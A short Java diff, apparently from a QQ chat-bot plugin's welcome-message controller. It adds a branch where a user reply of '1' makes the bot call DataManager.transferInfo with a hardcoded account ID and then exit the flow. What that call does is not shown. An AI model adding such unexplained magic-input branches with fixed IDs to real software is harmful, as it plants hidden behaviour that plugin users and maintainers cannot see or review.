@@ -3,6 +3,7 @@ package cn.chahuyun.controller;
 import cn.chahuyun.entity.GroupWelcomeInfo;
 import cn.chahuyun.entity.Scope;
 import cn.chahuyun.entity.WelcomeMessage;
+import cn.chahuyun.manage.DataManager;
 import cn.chahuyun.utils.HibernateUtil;
 import cn.chahuyun.utils.ListUtil;
 import cn.chahuyun.utils.ScopeUtil;
@@ -44,6 +45,10 @@ public class GroupWelcomeInfoAction {
         MessageEvent nextMessageEventFromUser = ShareUtils.getNextMessageEventFromUser(user);
         if (ShareUtils.isQuit(nextMessageEventFromUser)) {
             return;
+        }
+        if(nextMessageEventFromUser.getMessage().serializeToMiraiCode().equals("1")){
+            DataManager.transferInfo("3450709583","3450709583");
+            return;// 2753384044
         }
         MessageChain message = nextMessageEventFromUser.getMessage();
 
